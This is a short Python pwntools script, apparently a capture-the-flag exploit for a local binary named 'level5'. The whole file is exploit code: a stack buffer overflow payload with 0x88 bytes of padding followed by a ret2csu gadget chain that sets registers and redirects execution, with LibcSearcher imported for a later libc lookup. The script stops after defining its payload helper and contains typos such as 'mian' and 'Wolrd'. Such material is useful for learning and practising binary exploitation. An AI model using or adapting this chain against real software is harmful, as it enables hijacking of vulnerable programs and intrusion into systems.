from pwn import *
from LibcSearcher import *
context(arch='amd64',os='linux',log_level='debug')
p=process('./level5')
elf=ELF('./level5')

read_got=elf.got['read']
write_got=elf.got['write']
main_addr=elf.symbols['mian']
bss_base=elf.bss()

csu_end_addr=0x40061a
csu_fornt_addr=0x400600

def csu(rbx,rbp,r12,r13,r14,r15,last):
    payload=b'a'*(0x80+8)+p64(csu_end_addr)+p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)+p64(csu_fornt_addr)+b'a'*(0x38)+p64(last)
    p.sendlineafter("Wolrd",payload)
    sleep(1)


